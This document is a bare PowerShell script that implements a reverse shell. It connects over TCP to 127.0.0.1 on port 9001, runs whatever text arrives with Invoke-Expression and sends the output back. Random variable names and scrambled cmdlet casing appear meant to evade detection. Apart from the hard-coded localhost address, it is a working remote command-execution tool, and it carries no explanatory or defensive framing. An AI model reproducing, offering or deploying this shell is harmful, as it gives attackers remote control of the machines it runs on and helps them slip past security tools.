$vjebefbrjv = New-Object Net.Sockets.TCPClient('127.0.0.1', 9001);
$dihgurhd = $vjebefbrjv.GetStream();
$ahcebfja = New-Object IO.StreamWriter($dihgurhd);

function HIEKFYBSG ($ytgbnjuytgb) {
    [byte[]]$script:vnowubvwo = 0..$vjebefbrjv.ReceiveBufferSize | % {0};
    $ahcebfja.Write($ytgbnjuytgb + ' > ');
    $ahcebfja.Flush();
}

HIEKFYBSG '';

while(($rfjuytfujnbvfty = $dihgurhd.Read($vnowubvwo, 0, $vnowubvwo.Length)) -gt 0) {
    $jdugwbvebbb = ([text.encoding]::UTF8).GetString($vnowubvwo, 0, $rfjuytfujnbvfty - 1);
    $wussuwb = try {
        IeX $jdugwbvebbb 2>&1 | oUt-sTRIng
    } catch {
        $_ | oUT-sTriNG
    }
    HIEKFYBSG ($wussuwb)
}

$ahcebfja.Close()